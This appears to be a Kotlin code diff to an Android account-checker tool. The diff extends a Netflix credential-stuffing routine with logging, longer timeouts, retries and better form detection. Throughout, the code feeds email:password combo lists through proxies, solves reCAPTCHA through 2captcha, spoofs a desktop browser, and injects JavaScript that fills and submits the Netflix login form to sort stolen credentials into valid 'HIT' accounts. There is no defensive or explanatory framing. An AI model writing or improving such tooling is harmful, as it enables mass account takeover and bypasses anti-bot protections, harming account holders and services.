@@ -36,6 +36,11 @@ class AccountChecker(private val config: CheckConfig, private val webView: WebVi
 
     var onResult: ((Account) -> Unit)? = null
     var onStatsUpdate: ((CheckStats) -> Unit)? = null
+    var onLog: ((String) -> Unit)? = null
+
+    private fun log(msg: String) {
+        onLog?.invoke(msg)
+    }
 
     private var stats = CheckStats()
     private var proxies = mutableListOf<Proxy>()
@@ -330,19 +335,23 @@ stats.cpm = stats.computeCpm()
 
         netflixGqlPost(client, gqlHeaders, initPayload) { initBody, initCode ->
             if (!netflixHandleHttp(combo, cont, initCode)) return@netflixGqlPost
+            log("Netflix(api): CLCS init HTTP $initCode")
 
             val serverState = nfDeepFind(initBody, "serverState")
             val serverScreenUpdate = nfDeepFind(initBody, "serverScreenUpdate")
             if (serverState.isNullOrEmpty() || serverScreenUpdate.isNullOrEmpty()) {
+                log("Netflix(api): could not init session (state=${serverState != null} ssu=${serverScreenUpdate != null})")
                 cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: could not init session"))
                 return@netflixGqlPost
             }
 
             solveTwoCaptchaV3(client) { token ->
                 if (token == null) {
+                    log("Netflix(api): 2captcha failed to return token")
                     cont.resume(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA solve failed"))
                     return@solveTwoCaptchaV3
                 }
+                log("Netflix(api): 2captcha token received")
 
                 val updatePayload = JSONObject()
                     .put("operationName", "CLCSScreenUpdate")
@@ -390,6 +399,7 @@ stats.cpm = stats.computeCpm()
                             details = "Netflix: unexpected response"
                         }
                     }
+                    log("Netflix(api): login HTTP $updateCode -> ${status.name}")
                     cont.resume(createResult(combo, status, details))
                 }
             }
@@ -521,13 +531,16 @@ stats.cpm = stats.computeCpm()
         return withContext(Dispatchers.Main) {
             suspendCoroutine { cont ->
                 val wv = webView ?: run {
+                    log("Netflix(browser): no WebView available")
                     cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: WebView unavailable"))
                     return@suspendCoroutine
                 }
                 var settled = false
                 val startedAt = System.currentTimeMillis()
-                val timeoutMs = 32000L
+                val timeoutMs = 45000L
                 val handler = Handler(Looper.getMainLooper())
+                var lastLogState = ""
+                var fillInjectedAt = 0L
 
                 fun settle(acc: Account) {
                     if (settled) return
@@ -537,12 +550,19 @@ stats.cpm = stats.computeCpm()
                         CookieManager.getInstance().removeAllCookies(null)
                         wv.stopLoading()
                     } catch (_: Exception) {}
+                    log("Netflix(browser): RESULT ${acc.status.name} | ${acc.details} | ${combo.email}")
                     cont.resume(acc)
+                }
+
+                fun injectFill() {
+                    fillInjectedAt = System.currentTimeMillis()
+                    log("Netflix(browser): injecting credentials into form")
+                    fillNetflixLogin(wv, combo)
                 }
 
                 fun pollResult() {
                     if (settled) return
-                    val js = "(function(){var u=location.href;var t='';try{t=(document.body?document.body.innerText:'').slice(-2000);}catch(x){}var err=!!(document.querySelector('[data-uia=\"alert-error\"]')||document.querySelector('[data-uia=\"field-error\"]')||document.querySelector('.hasError'));return JSON.stringify({u:u,err:err,t:t});})()"
+                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:(window.__silverbullet||'')});})()"""
                     wv.evaluateJavascript(js) { raw ->
                         if (settled) return@evaluateJavascript
                         val data = try {
@@ -550,23 +570,49 @@ stats.cpm = stats.computeCpm()
                         } catch (e: Exception) { null }
 
                         val url = data?.optString("u", "") ?: ""
-                        if (url.contains("/browse") || url.contains("YourAccount") || url.contains("profiles")) {
-                            settle(createResult(combo, AccountStatus.HIT, "Valid Netflix account"))
-                            return@evaluateJavascript
+                        val title = data?.optString("tt", "") ?: ""
+                        val fs = data?.optString("fs", "") ?: ""
+                        val err = data?.optBoolean("err", false) == true
+                        val cap = data?.optBoolean("cap", false) == true
+                        val snippet = (data?.optString("t", "") ?: "").take(140)
+                        val elapsed = System.currentTimeMillis() - startedAt
+
+                        val stateKey = "u=$url|fs=$fs|err=$err"
+                        if (stateKey != lastLogState) {
+                            lastLogState = stateKey
+                            log("Netflix(browser): url=$url | title=${title.take(60)} | fill=$fs | err=$err | cap=$cap | body=$snippet")
                         }
-                        if (data?.optBoolean("err", false) == true) {
-                            val text = (data?.optString("t", "") ?: "").lowercase()
-                            val blocked = text.contains("try again") || text.contains("in a few minutes") ||
-                                text.contains("captcha") || text.contains("recaptcha") || text.contains("too many attempts")
-                            settle(createResult(combo, if (blocked) AccountStatus.CAPTCHA else AccountStatus.FAIL,
-                                if (blocked) "Netflix: blocked by reCAPTCHA" else "Wrong Netflix credentials"))
-                            return@evaluateJavascript
+
+                        when {
+                            url.contains("/browse") || url.contains("YourAccount") || url.contains("profiles") -> {
+                                settle(createResult(combo, AccountStatus.HIT, "Valid Netflix account"))
+                            }
+                            err -> {
+                                val bodyText = (data?.optString("t", "") ?: "").lowercase()
+                                val blocked = bodyText.contains("try again") || bodyText.contains("in a few minutes") ||
+                                    bodyText.contains("captcha") || bodyText.contains("recaptcha") || bodyText.contains("too many attempts")
+                                settle(createResult(combo, if (blocked) AccountStatus.CAPTCHA else AccountStatus.FAIL,
+                                    if (blocked) "Netflix: blocked by reCAPTCHA" else "Wrong Netflix credentials"))
+                            }
+                            fs == "submitted" && cap && elapsed > 20000 && !url.contains("browse") -> {
+                                settle(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA challenge shown"))
+                            }
+                            fs.isEmpty() && elapsed > 20000 && System.currentTimeMillis() - fillInjectedAt > 15000 -> {
+                                log("Netflix(browser): login form never appeared, retrying fill")
+                                injectFill()
+                                handler.postDelayed({ pollResult() }, 1500)
+                            }
+                            fs == "no_fields" && elapsed > 20000 && System.currentTimeMillis() - fillInjectedAt > 15000 -> {
+                                log("Netflix(browser): fields not found, retrying fill")
+                                injectFill()
+                                handler.postDelayed({ pollResult() }, 1500)
+                            }
+                            elapsed > timeoutMs -> {
+                                settle(createResult(combo, AccountStatus.ERROR,
+                                    "Netflix: browser timeout url=$url fill=$fs"))
+                            }
+                            else -> handler.postDelayed({ pollResult() }, 1200)
                         }
-                        if (System.currentTimeMillis() - startedAt > timeoutMs) {
-                            settle(createResult(combo, AccountStatus.ERROR, "Netflix: browser timeout"))
-                            return@evaluateJavascript
-                        }
-                        handler.postDelayed({ pollResult() }, 1200)
                     }
                 }
 
@@ -578,17 +624,34 @@ stats.cpm = stats.computeCpm()
                     wv.settings.userAgentString =
                         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                     wv.webViewClient = object : WebViewClient() {
+                        override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
+                            if (!settled) log("Netflix(browser): nav=${request?.url}")
+                            return false
+                        }
+
                         override fun onPageFinished(view: WebView?, url: String?) {
                             if (settled) return
+                            log("Netflix(browser): page finished url=$url")
                             view?.postDelayed({
                                 if (settled) return@postDelayed
-                                fillNetflixLogin(view, combo)
+                                injectFill()
                             }, 1500)
                         }
+
+                        override fun onReceivedHttpError(
+                            view: WebView?,
+                            request: android.webkit.WebResourceRequest?,
+                            errorResponse: android.webkit.WebResourceResponse?
+                        ) {
+                            val code = errorResponse?.statusCode ?: -1
+                            log("Netflix(browser): http error $code url=${request?.url}")
+                        }
                     }
+                    log("Netflix(browser): loading login page for ${combo.email}")
                     wv.loadUrl("https://www.netflix.com/login?locale=en-US")
-                    handler.postDelayed({ pollResult() }, 8000)
+                    handler.postDelayed({ pollResult() }, 7000)
                 } catch (e: Exception) {
+                    log("Netflix(browser): WebView init failed: ${e.message}")
                     settle(createResult(combo, AccountStatus.ERROR, "Netflix: WebView failed: ${e.message}"))
                 }
             }
@@ -598,17 +661,27 @@ stats.cpm = stats.computeCpm()
     private fun fillNetflixLogin(view: WebView, combo: Combo) {
         val email = JSONObject.quote(combo.email)
         val pass = JSONObject.quote(combo.password)
-        val js = "(function(){var EMAIL=$email;var PASS=$pass;" +
-            "function sv(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;" +
-            "s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));}" +
-            "var tries=0;var t=setInterval(function(){tries++;" +
-            "var u=document.querySelector('#id_userLoginId');var p=document.querySelector('#id_password');" +
-            "if(!u||!p){if(tries>30)clearInterval(t);return;}" +
-            "if(document.querySelector('[data-uia=\"alert-error\"],[data-uia=\"field-error\"],.hasError')){clearInterval(t);return;}" +
-            "if(u.value&&p.value)return;sv(u,EMAIL);sv(p,PASS);" +
-            "var b=document.querySelector('[data-uia=\"login-submit-button\"]')||document.querySelector('button[type=\"submit\"]');" +
-            "if(b){clearInterval(t);setTimeout(function(){b.click();},250);}},200);})()"
-        view.evaluateJavascript(js, null)
+        val js = """(function(){
+try{
+var EMAIL=%EMAIL%;var PASS=%PASS%;
+function sv(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));}
+var tries=0;
+var t=setInterval(function(){tries++;
+var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');
+var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');
+if(!u||!p){window.__silverbullet='no_fields';if(tries>48)clearInterval(t);return;}
+if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(t);return;}
+if(u.value&&p.value&&window.__silverbullet==='submitted')return;
+window.__silverbullet='fields_found';
+sv(u,EMAIL);sv(p,PASS);
+var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');
+if(b){window.__silverbullet='submitting';clearInterval(t);setTimeout(function(){b.click();window.__silverbullet='submitted';},250);}
+},250);
+}catch(e){window.__silverbullet='fill_js_err';}
+})()"""
+        view.evaluateJavascript(
+            js.replace("%EMAIL%", email).replace("%PASS%", pass), null
+        )
     }
 
     private suspend fun checkRoblox(combo: Combo): Account = suspendCoroutine { cont ->
